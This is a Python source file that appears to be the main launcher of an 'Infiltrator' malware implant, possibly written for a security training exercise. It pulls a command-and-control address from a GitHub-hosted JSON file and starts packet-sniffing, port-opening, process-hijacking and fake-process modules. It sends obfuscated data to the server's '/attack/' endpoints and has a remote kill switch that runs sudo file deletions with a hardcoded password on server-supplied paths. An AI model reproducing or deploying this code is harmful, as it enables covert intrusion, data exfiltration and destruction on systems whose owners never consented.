# -*- coding: utf-8 -*-
"""
Created on Thu Jan 28 13:52:06 2021

@author: GoldBigDragon
"""

import subprocess
import module_network_packetSniffer
import module_network_portOpener
# import module_system_mysqlBruteForce
import module_system_fakeUploader
import module_process_fakeProcessGenerator
import module_process_processJacker

from datetime import datetime
import module_etc_file
import json
import requests
import threading
import sys

global serverAddress
serverAddress = 'http://192.168.219.100:3123'
global start
start = True

def serverSender(subUrl, data):
    global serverAddress
    # binary
    hexData = {'data':  "b"+"".join("{:02x}".format(ord(c)) for c in data[::-1])}
    try:
        requests.post(serverAddress + subUrl, data=json.dumps(hexData), timeout=60)
    except Exception:
        pass

def suicide():
    global start
    global serverAddress
    try:
        data = requests.get('https://raw.githubusercontent.com/GoldBigDragon/GoldBigDragon.github.io/master/version/BoB.json', timeout=60).json()
        infiltratorData = data['Infiltrator']
        if infiltratorData['terminate'] == 1:
            start = False
    except Exception:
        pass
    if start == True:
        threading.Timer(5, suicide).start()
    else:
        try:
            needRemoves = requests.get(serverAddress+'/file/getNeedRemoves', timeout=60).json()
            if needRemoves != None:
                for row in needRemoves:
                    nowTime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    subprocess.getoutput('echo user | sudo -S rm ' + row["directoryName"] + '/' + row["fileName"])
                    subprocess.getoutput('echo user | sudo -S rmdir ' + row["directoryName"])
                    data = {'time': nowTime, 'id': row['id']}
                    serverSender('/attack/post-deleteFile', json.dumps(data))
                    data = {'time': nowTime, 'type': "Suicide", 'message': "File '" + row["directoryName"]+'/'+row["fileName"] + "' was deleted."}
                    serverSender('/attack/post-log', json.dumps(data))
        except Exception:
            pass
        subprocess.getoutput('echo user | sudo -S rm .gitIgnore')
        sys.exit(0)
        
def getServerAddress():
    global serverAddress
    try:
        data = requests.get('https://raw.githubusercontent.com/GoldBigDragon/GoldBigDragon.github.io/master/version/BoB.json', timeout=60).json()
        infiltratorData = data['Infiltrator']
        serverAddress = "http://" + infiltratorData['CnC'] + ":" + str(infiltratorData['Port'])
    except Exception:
        pass

if __name__ == '__main__':
    getServerAddress()
    threading.Timer(0, module_network_packetSniffer.start).start()
    threading.Timer(1, module_network_portOpener.start).start()
    # threading.Timer(0, module_system_mysqlBruteForce.start).start()
    threading.Timer(1, module_system_fakeUploader.start).start()
    threading.Timer(0, module_process_fakeProcessGenerator.start).start()
    threading.Timer(3, module_process_fakeProcessGenerator.start).start()
    threading.Timer(1, module_process_processJacker.start).start()
    threading.Timer(0, module_etc_file.start).start()
    threading.Timer(5, suicide).start()
